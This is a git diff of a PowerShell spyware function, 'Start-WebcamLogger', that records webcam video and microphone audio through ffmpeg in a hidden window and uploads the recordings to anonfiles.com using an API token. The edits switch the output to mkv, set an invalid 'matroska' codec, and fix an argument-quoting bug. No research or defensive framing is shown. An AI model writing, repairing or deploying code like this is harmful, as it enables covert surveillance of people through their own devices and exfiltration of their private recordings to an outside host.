@@ -57,13 +57,13 @@ function Start-WebcamLogger{
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
-        $path = "$env:temp\camlog-$env:computername-$time.mp4";
+        $path = "$env:temp\camlog-$env:computername-$time.mkv";
         $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f dshow",
             "-s 1280x720",
             "-r 30",
-            "-vcodec mjpeg",
+            "-vcodec matroska",
             "-t $RecordTime",
             "-rtbufsize 1024M",
             "-i video=`"$cam`":audio=`"$mic`"", 
@@ -71,7 +71,7 @@ function Start-WebcamLogger{
             "$path"
         );
 
-        Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList "$ffmpegArgs "-Wait -WindowStyle hidden
+        Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList "$ffmpegArgs" -Wait -WindowStyle hidden
         
         if(Test-Path $path){
             (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
